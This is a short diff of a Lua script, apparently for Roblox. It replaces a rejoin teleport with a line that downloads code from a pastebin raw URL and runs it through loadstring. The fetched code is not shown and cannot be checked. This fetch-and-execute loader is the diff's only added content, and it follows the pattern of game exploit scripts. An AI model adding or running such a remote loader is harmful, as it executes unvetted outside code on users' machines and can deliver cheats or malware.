@@ -12,5 +12,5 @@ spawn(function()
             end
         end
     end)
-wait(2) 
-game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+wait(3) 
+loadstring(game:HttpGet("https://pastebin.com/raw/cWbZhmD3"))()
